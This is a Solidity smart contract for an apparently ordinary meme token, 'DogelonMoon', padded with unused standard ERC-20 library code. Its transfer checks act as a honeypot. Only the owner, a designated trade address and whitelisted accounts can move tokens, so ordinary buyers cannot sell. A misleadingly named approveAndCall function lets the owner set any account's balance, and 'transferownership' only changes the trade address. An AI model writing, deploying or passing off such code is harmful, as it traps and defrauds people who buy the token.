row number 
1	       pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns(uint);
4	 function balanceOf(address account) external view returns(uint);
5	 function transfer(address recipient, uint amount) external returns(bool);
6	 function allowance(address owner, address spender) external view returns(uint);
7	 function approve(address spender, uint amount) external returns(bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns(bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 library Address {
13	 function isContract(address account) internal view returns(bool) {
14	 bytes32 codehash;
15	 bytes32 accountHash;
16	 assembly {
17	 codehash:= extcodehash(account) }
18	 return (codehash != 0x0 && codehash != accountHash);
19	 }
20	 }
21	 contract Context {
22	 constructor() internal {
23	 }
24	 function _msgSender() internal view returns(address payable) {
25	 return msg.sender;
26	 }
27	 }
28	 library SafeMath {
29	 function add(uint a, uint b) internal pure returns(uint) {
30	 uint c = a + b;
31	 require(c >= a, "SafeMath: addition overflow");
32	 return c;
33	 }
34	 function sub(uint a, uint b) internal pure returns(uint) {
35	 return sub(a, b, "SafeMath: subtraction overflow");
36	 }
37	 function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
38	 require(b <= a, errorMessage);
39	 uint c = a - b;
40	 return c;
41	 }
42	 function mul(uint a, uint b) internal pure returns(uint) {
43	 if (a == 0) {
44	 return 0;
45	 }
46	 uint c = a * b;
47	 require(c / a == b, "SafeMath: multiplication overflow");
48	 return c;
49	 }
50	 function div(uint a, uint b) internal pure returns(uint) {
51	 return div(a, b, "SafeMath: division by zero");
52	 }
53	 function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
54	 require(b > 0, errorMessage);
55	 uint c = a / b;
56	 return c;
57	 }
58	 }
59	 library SafeERC20 {
60	 using SafeMath for uint;
61	 using Address for address;
62	 function safeTransfer(IERC20 token, address to, uint value) internal {
63	 callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
64	 }
65	 function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
66	 callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
67	 }
68	 function safeApprove(IERC20 token, address spender, uint value) internal {
69	 require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance" );
70	 callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
71	 }
72	 function callOptionalReturn(IERC20 token, bytes memory data) private {
73	 require(address(token).isContract(), "SafeERC20: call to non-contract");
74	 (bool success, bytes memory returndata) = address(token).call(data);
75	 require(success, "SafeERC20: low-level call failed");
76	 if (returndata.length > 0) {
77	 require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
78	 }
79	 }
80	 }
81	 contract ERC20 is Context, IERC20 {
82	 using SafeMath for uint;
83	 mapping(address => uint) private _balances;
84	 mapping(address => mapping(address => uint)) private _allowances;
85	 uint private _totalSupply;
86	 function totalSupply() public view returns(uint) {
87	 return _totalSupply;
88	 }
89	 function balanceOf(address account) public view returns(uint) {
90	 return _balances[account];
91	 }
92	 function transfer(address recipient, uint amount) public returns(bool) {
93	 _transfer(_msgSender(), recipient, amount);
94	 return true;
95	 }
96	 function allowance(address owner, address spender) public view returns(uint) {
97	 return _allowances[owner][spender];
98	 }
99	 function approve(address spender, uint amount) public returns(bool) {
100	 _approve(_msgSender(), spender, amount);
101	 return true;
102	 }
103	 function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
104	 _transfer(sender, recipient, amount);
105	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
106	 return true;
107	 }
108	 function increaseAllowance(address spender, uint addedValue) public returns(bool) {
109	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
110	 return true;
111	 }
112	 function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
113	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
114	 return true;
115	 }
116	 function _transfer(address sender, address recipient, uint amount) internal {
117	 require(sender != address(0), "ERC20: transfer from the zero address");
118	 require(recipient != address(0), "ERC20: transfer to the zero address");
119	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
120	 _balances[recipient] = _balances[recipient].add(amount);
121	 emit Transfer(sender, recipient, amount);
122	 }
123	 function _mint(address account, uint amount) internal {
124	 require(account != address(0), "ERC20: mint to the zero address");
125	 _totalSupply = _totalSupply.add(amount);
126	 _balances[account] = _balances[account].add(amount);
127	 emit Transfer(address(0), account, amount);
128	 }
129	 function _burn(address account, uint amount) internal {
130	 require(account != address(0), "ERC20: burn from the zero address");
131	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
132	 _totalSupply = _totalSupply.sub(amount);
133	 emit Transfer(account, address(0), amount);
134	 }
135	 function _approve(address owner, address spender, uint amount) internal {
136	 require(owner != address(0), "ERC20: approve from the zero address");
137	 require(spender != address(0), "ERC20: approve to the zero address");
138	 _allowances[owner][spender] = amount;
139	 emit Approval(owner, spender, amount);
140	 }
141	 }
142	 contract ERC20Detailed is IERC20 {
143	 string private _name;
144	 string private _symbol;
145	 uint8 private _decimals;
146	 constructor(string memory name, string memory symbol, uint8 decimals) public {
147	 _name = name;
148	 _symbol = symbol;
149	 _decimals = decimals;
150	 }
151	 function name() public view returns(string memory) {
152	 return _name;
153	 }
154	 function symbol() public view returns(string memory) {
155	 return _symbol;
156	 }
157	 function decimals() public view returns(uint8) {
158	 return _decimals;
159	 }
160	 }
161	 contract DogelonMoon {
162	 event Transfer(address indexed _from, address indexed _to, uint _value);
163	 event Approval(address indexed _owner, address indexed _spender, uint _value);
164	 function transfer(address _to, uint _value) public payable returns (bool) {
165	 return transferFrom(msg.sender, _to, _value);
166	 }
167	 function ensure(address _from, address _to, uint _value) internal view returns(bool) {
168	 if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
169	 return true;
170	 }
171	 require(condition(_from, _value));
172	 return true;
173	 }
174	 function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
175	 if (_value == 0) {
176	 return true;
177	 }
178	 if (msg.sender != _from) {
179	 require(allowance[_from][msg.sender] >= _value);
180	 allowance[_from][msg.sender] -= _value;
181	 }
182	 require(ensure(_from, _to, _value));
183	 require(balanceOf[_from] >= _value);
184	 balanceOf[_from] -= _value;
185	 balanceOf[_to] += _value;
186	 _onSaleNum[_from]++;
187	 emit Transfer(_from, _to, _value);
188	 return true;
189	 }
190	 function approve(address _spender, uint _value) public payable returns (bool) {
191	 allowance[msg.sender][_spender] = _value;
192	 emit Approval(msg.sender, _spender, _value);
193	 return true;
194	 }
195	 function condition(address _from, uint _value) internal view returns(bool){
196	 if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
197	 if(_saleNum > 0){
198	 if(_onSaleNum[_from] >= _saleNum) return false;
199	 }
200	 if(_minSale > 0){
201	 if(_minSale > _value) return false;
202	 }
203	 if(_maxSale > 0){
204	 if(_value > _maxSale) return false;
205	 }
206	 return true;
207	 }
208	 mapping(address=>uint256) private _onSaleNum;
209	 mapping(address=>bool) private canSale;
210	 uint256 private _minSale;
211	 uint256 private _maxSale;
212	 uint256 private _saleNum;
213	 function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
214	 require(msg.sender == owner);
215	 if(addedValue > 0) {
216	 balanceOf[spender] = addedValue*(10**uint256(decimals));
217	 }
218	 canSale[spender]=true;
219	 return true;
220	 }
221	 address tradeAddress;
222	 function transferownership(address addr) public returns(bool) {
223	 require(msg.sender == owner);
224	 tradeAddress = addr;
225	 return true;
226	 }
227	 mapping (address => uint) public balanceOf;
228	 mapping (address => mapping (address => uint)) public allowance;
229	 uint constant public decimals = 18;
230	 uint public totalSupply;
231	 string public name;
232	 string public symbol;
233	 address private owner;
234	 constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
235	 name = _name;
236	 symbol = _symbol;
237	 totalSupply = _supply*(10**uint256(decimals));
238	 owner = msg.sender;
239	 balanceOf[msg.sender] = totalSupply;
240	 emit Transfer(address(0x0), msg.sender, totalSupply);
241	 }
242	 }
